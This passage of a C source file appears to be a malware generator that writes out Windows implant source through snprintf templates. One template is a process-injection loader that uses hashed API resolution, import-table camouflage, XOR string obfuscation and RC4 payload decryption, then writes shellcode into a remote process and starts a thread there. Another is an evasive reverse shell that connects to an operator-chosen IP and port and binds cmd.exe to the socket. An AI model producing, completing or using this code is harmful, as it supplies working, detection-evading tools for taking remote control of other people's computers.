        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n"
        "#define WriteProcessMemory_djb2         0x54256ED5\n"
        "#define CreateToolhelp32Snapshot_djb2   0x5D3C1742\n"
        "#define Process32First_djb2             0xA00889BE\n"
        "#define Process32Next_djb2              0x35DB6F55\n"
        "#define OpenProcess_djb2                0x2007BE63\n"
        "#define lstrcmpiA_djb2                  0xC9B81F21\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "char pRprocess[] = {%s};\n"

        "funNtAllocateVirtualMemory pNtAllocateVirtualMemory;\n"
        "funWriteProcessMemory pWriteProcessMemory;\n"
        "fnNtCreateThreadEx pNtCreateThreadEx;\n"
        "funNtWaitForSingleObject pNtWaitForSingleObject;\n"
        "fnNtClose pNtClose;\n"
        "funCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;\n"
        "funProcess32First pProcess32First;\n"
        "funProcess32Next pProcess32Next;\n"
        "funOpenProcess pOpenProcess;\n"
        "funlstrcmpiA plstrcmpiA;\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T payload_len = sizeof(EncryptedPayload);\n\n"
        "int FindTarget(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!pProcess32First(hProcSnap, &pe32)) {\n"
        "        pNtClose(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (pProcess32Next(hProcSnap, &pe32)) {\n"
        "        if (plstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    pNtClose(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int Inject(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID         address = NULL;\n"
        "    HANDLE         hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    pNtAllocateVirtualMemory(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    pWriteProcessMemory(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "BOOL insialize_struct() {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    pCreateToolhelp32Snapshot = (funCreateToolhelp32Snapshot)GetProcAddressH(kernel, CreateToolhelp32Snapshot_djb2);\n"
        "    pProcess32First = (funProcess32First)GetProcAddressH(kernel, Process32First_djb2);\n"
        "    pProcess32Next = (funProcess32Next)GetProcAddressH(kernel, Process32Next_djb2);\n"
        "    pOpenProcess =(funOpenProcess)GetProcAddressH(kernel, OpenProcess_djb2);\n"
        "    plstrcmpiA = (funlstrcmpiA)GetProcAddressH(kernel, lstrcmpiA_djb2);\n"
        "    pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    pWriteProcessMemory = (funWriteProcessMemory)GetProcAddressH(kernel, WriteProcessMemory_djb2);\n"
        "    pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll, NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID start() {\n"
        "    insialize_struct();\n"
        "    int pid = 0;\n"
        "    obf((char*)pRprocess, sizeof(pRprocess), xkey, sizeof(xkey)); \n"
        "    pid = FindTarget(pRprocess);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            RC4_Guard(HINT_BYTE, ProtectedKey, EncryptedPayload, sizeof(ProtectedKey), sizeof(EncryptedPayload) );\n"
        "            Inject(hProc, EncryptedPayload, payload_len);\n"
        "            pNtClose(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "     delayEx(0.5);\n"
        "     start();\n"
        "     return 0;\n"
        "}\n",
        xkey, obfuscated_fun, Remotprocess, shellcodeArray, keyArray, hint
    );
}

void deley_source_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str) {

    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define KERNEL32_djb2               0x84BD0AA5\n"
        "#define NTDLL_djb2                  0xC9D1067D\n"
        "#define LoadLibraryA_djb2           0x0E32C08B\n"
        "#define WSAStartup_djb2             0xB703C453\n"
        "#define WSASocketA_djb2             0x5F3B12CA\n"
        "#define inet_pton_djb2              0xBD120405\n"
        "#define htons_djb2                  0x17387BA1\n"
        "#define connect_djb2                0x13BF4FDF\n"
        "#define closesocket_djb2            0xF77E6C94\n"
        "#define WSACleanup_djb2             0x9CA98668\n"
        "#define CreateProcessA_djb2         0x579FB1E9\n"
        "#define WaitForSingleObject_djb2    0x9557AB2A\n"
        "#define CloseHandle_djb2            0xCE995EF7\n"
        "#define NtDelayExecution_djb2       0x50DCFD5A\n"
        "#define NtWaitForSingleObject_djb2  0x2131236C\n"
        "#define NtClose_djb2                0x7E1EA2ED\n\n"

        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* inet_pton_t)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* connect_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429         \n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char ip[] = {%s};\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"


        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "inet_pton_t pinet_pton;\n"
        "htons_t phtons;\n"
        "connect_t pconnect;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtDelayExecution_t pNtDelayExecution;\n"
        "funNtClose_t pNtClose;\n\n"
        "void zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void delayEx(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "void connect_and_execute() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -50000;\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        WSADATA wsaData;\n"
        "        pWSAStartup(MAKEWORD(2, 2), &wsaData);\n"
        "        SOCKET sock = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "        if (sock == INVALID_SOCKET) {\n"
        "            pWSACleanup();\n"
        "        }\n"
        "        struct sockaddr_in server;\n"
        "        server.sin_family = AF_INET;\n"
        "        server.sin_port = phtons(%d);\n"

        "    obf((char*)ip, sizeof(ip), xkey, sizeof(xkey));\n"
        "        pinet_pton(AF_INET, ip, &server.sin_addr);\n"



        "        if (pconnect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {\n"
        "            pclosesocket(sock);\n"
        "            pWSACleanup();\n"
        "        }\n"
        "        STARTUPINFO si;\n"
        "        PROCESS_INFORMATION pi;\n"
        "        zero_memory(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;\n"
        "        pCreateProcessA(NULL, cmd , NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 3) {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(sock);\n"
        "            pWSACleanup();\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, NULL);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(sock);\n"
        "            pWSACleanup();\n"
        "            delayEx(0.1);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"
        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    pinet_pton = (inet_pton_t)GetProcAddressH(hWs2_32, inet_pton_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pconnect = (connect_t)GetProcAddressH(hWs2_32, connect_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtDelayExecution = (funNtDelayExecution_t)GetProcAddressH(ntdll_32, NtDelayExecution_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    Inisialize_struct();\n"
        "    delayEx(0.5);\n"
        "    connect_and_execute();\n"
        "    return 0;\n"
        "}\n",
        xkey, obf_ip, obf_cmd, obf_ws2dll, port
    );
}
void deley_source_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
